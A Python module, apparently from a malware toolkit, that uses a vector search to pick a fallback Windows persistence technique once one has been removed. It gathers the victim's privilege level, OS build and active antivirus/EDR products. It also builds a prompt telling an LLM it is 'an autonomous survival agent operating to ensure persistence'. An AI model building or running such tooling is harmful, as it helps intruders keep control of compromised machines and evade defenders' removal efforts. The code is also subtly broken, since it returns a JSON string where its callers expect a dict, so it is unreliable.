import os
import json
from langchain_community.vectorstores import FAISS
from langchain_community.embeddings.fastembed import FastEmbedEmbeddings
try:
    from rag_engine import system_context          # when imported from project root
except ImportError:
    import system_context                          # when run directly inside rag_engine/

def get_survival_strategy(failed_technique: str, blacklist: list) -> dict:
    """
    Loads a local FAISS index, and returns the single most semantically similar
    persistence technique that is NOT in the blacklist.

    Since the vector store has chunks equal to the number of techniques (one per technique), we search
    all results ranked by similarity score, then walk down the ranked list and
    return the first non-blacklisted technique.

    :param failed_technique: Filename of the technique that just failed/was removed.
    :param blacklist: A list of technique filenames to exclude (already tried / failed).
    :return: A dict with keys:
               - 'selected_technique': filename of the best available technique (str)
               - 'similarity_score':   FAISS L2 distance of the chosen result (float, lower = more similar)
               - 'prompt_payload':     Full JSON prompt string for the LLM confirmation step (str)
             OR a dict with key 'error' if something went wrong.
    """

    # 1. Initialize embedding model (must match the model used during indexing)
    embeddings = FastEmbedEmbeddings()

    # Dynamically resolve path to the vector_store relative to this script
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    vector_store_dir = os.path.join(base_dir, "vector_store")

    # 2. Load the local FAISS index
    try:
        # allow_dangerous_deserialization=True is required in newer LangChain
        # versions when loading local FAISS (pickle) stores.
        vector_store = FAISS.load_local(
            vector_store_dir,
            embeddings,
            allow_dangerous_deserialization=True
        )
    except Exception as e:
        return {"error": f"Failed to load vector store: {e}"}

    # 3. Perform ranked similarity search across ALL techniques.
    # We fetch all the techniques so the full ranked list is available.
    # FAISS returns (Document, score) pairs sorted by L2 distance — lower score = more similar.
    query = f"persistence technique alternative to {failed_technique}"
    ranked_results = vector_store.similarity_search_with_score(query, k=9)

    # 4. Walk down the ranked list and pick the FIRST non-blacklisted technique.
    # Because the vector store has exactly one chunk per technique, each result maps
    # cleanly to one unique technique — no deduplication needed.
    selected_doc = None
    selected_score = None

    for doc, score in ranked_results:
        source_path = doc.metadata.get("source", "")
        source_filename = os.path.basename(source_path)

        # Skip the failed technique itself and anything in the blacklist
        is_blacklisted = any(
            bad_file.lower() in source_filename.lower() for bad_file in blacklist
        )
        # Also skip the failed technique if it wasn't explicitly added to the blacklist yet
        is_failed = (source_filename.lower() == failed_technique.lower())

        if not is_blacklisted and not is_failed:
            selected_doc = doc
            selected_score = score
            break

    if selected_doc is None:
        return {"error": "No available technique found — all techniques are blacklisted."}

    selected_filename = os.path.basename(selected_doc.metadata.get("source", ""))

    # 5. Collect live system metadata to enrich the prompt.
    # This lets the LLM (and any human reviewer) know the exact environment in which
    # the agent is operating: privilege level, OS version, and active AV/EDR products.
    sys_ctx = system_context.collect()

    # 6. Build a structured LLM prompt payload (used by survival_agent.py for confirmation).
    # The LLM is told exactly which technique was selected; it only needs to confirm and act.
    prompt_payload = {
        "system_instruction": (
            "You are an autonomous survival agent operating to ensure persistence. "
            "You must STRICTLY return ONLY the filename of the next technique to deploy. "
            "You must wrap the filename in [TARGET] and [/TARGET] tags. "
            "Example: [TARGET]new_persistence.cpp[/TARGET]"
        ),
        "prompt_metadata": {
            "privilege_level": sys_ctx["privilege_level"],
            "os_build":        sys_ctx["os_build"],
            "av_edr_status":   sys_ctx["av_edr_status"],
        },
        "failed_technique": failed_technique,
        "blacklisted_techniques": blacklist,
        "selected_technique": selected_filename,
        "similarity_score": float(selected_score),
        "task": (
            f"The persistence technique '{failed_technique}' has failed or been removed. "
            f"The RAG engine has identified '{selected_filename}' as the most semantically "
            f"similar available technique (score: {selected_score:.4f}). "
            f"Current environment — Privileges: {sys_ctx['privilege_level']}, "
            f"OS: {sys_ctx['os_build']}, "
            f"AV/EDR: {', '.join(av['name'] for av in sys_ctx['av_edr_status'])}. "
            f"Confirm by returning [TARGET]{selected_filename}[/TARGET]."
        )
    }

    return json.dumps(prompt_payload, indent=4)


if __name__ == "__main__":
    # Example: simulate registry_run_key failing, with itself and winlogon_shell blacklisted
    test_failed = "registry_run_key.cpp"
    test_blacklist = ["registry_run_key.cpp", "winlogon_shell.cpp"]

    result = get_survival_strategy(test_failed, test_blacklist)

    if "error" in result:
        print(f"[-] Error: {result['error']}")
    else:
        print(f"[+] Selected technique : {result['selected_technique']}")
        print(f"[+] Similarity score   : {result['similarity_score']:.4f}  (lower = more similar)")
        print(f"\n[*] LLM Prompt Payload:\n{result['prompt_payload']}")
